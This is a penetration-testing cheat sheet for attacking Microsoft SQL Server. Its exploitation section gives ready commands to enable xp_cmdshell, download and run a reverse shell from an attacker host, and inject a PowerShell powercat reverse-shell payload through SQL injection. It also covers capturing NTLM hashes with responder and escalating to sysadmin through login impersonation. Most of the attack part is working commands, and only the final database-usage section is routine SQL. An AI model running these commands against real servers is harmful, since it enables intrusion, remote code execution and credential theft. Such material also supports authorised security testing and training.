# Microsoft SQL (MSSQL)

Port 1433

### 1) Nmap Scan

    nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 IP

Enumerate MSSQL database information and configurations

    nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=<username>,mssql.password=<password>,mssql.instance-name=<instance_name> -sV -p 1433 IP

### 2) Netexec

Check MSSQL service and execute a command

    netexec mssql -d domain.local -u USERNAME -p PASSWORD -x "whoami" IP

Query databases and list them

    netexec mssql -d domain.local -u USERNAME -p PASSWORD -x "SELECT name FROM master.dbo.sysdatabases;" IP

### 3) Authentication

Linux

    sqsh -S IP -U USERNAME -P PASSWORD

Windows

    sqsh -S IP -U domain\\USERNAME -P PASSWORD -D DATABASE

### 4) Exploitation

Enable advanced options and xp_cmdshell for command execution

    EXEC SP_CONFIGURE 'show advanced options', 1;
    RECONFIGURE;
    GO
    
    EXEC SP_CONFIGURE 'xp_cmdshell', 1;
    RECONFIGURE;
    GO

Test xp_cmdshell to execute system commands

    exec xp_dirtree 'c:\'
    
    EXEC xp_cmdshell 'whoami';
    GO

Download and execute a reverse shell

    EXEC xp_cmdshell 'powershell "Invoke-WebRequest -Uri http://<attacker_ip>:<port>/reverse.exe -OutFile c:\\Users\\Public\\reverse.exe"';
    GO
    
    EXEC xp_cmdshell 'c:\\Users\\Public\\reverse.exe';
    GO

SQL Injection example to execute system commands

    test'; EXEC master.dbo.xp_cmdshell 'powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString(''http://<attacker_ip>:<port>/powercat.ps1'');powercat -c <attacker_ip> -p <port> -e powershell"';--

Get a hash

    -- Attacker: 

    sudo responder -A -I tun0

    -- Target:

    EXEC master..xp_dirtree '\\[Attacker_IP]\share\'

### 5) Impersonation (Windows AD)

Check for users we can impersonate

    SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'

Perform the Impersonation

    EXECUTE AS LOGIN = 'sa' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')

Verify Current User and Role

    SELECT SYSTEM_USER
    
    SELECT IS_SRVROLEMEMBER('sysadmin')
    
    go

Check Linked Databases

    SELECT srvname, isremote FROM sysservers;

Enable xp_cmdshell

    EXEC master.dbo.sp_configure 'show advanced options', 1;
    
    RECONFIGURE;

### 6) Database Usage

List all the databases

    SELECT name FROM master.dbo.sysdatabases

List all tables in the current schema

    SELECT * FROM information_schema.tables;

View contents of a specific table

    SELECT * FROM <table_name>;

Search for specific data in a table

    SELECT * FROM <table_name> WHERE <column_name> LIKE '%<search_term>%';

Insert a new record into a table

    INSERT INTO <table_name> (<column1>, <column2>) VALUES ('<value1>', '<value2>');

Update an existing record in a table

    UPDATE <table_name> SET <column_name> = '<new_value>' WHERE <condition>;

Delete a record from a table

    DELETE FROM <table_name> WHERE <condition>;
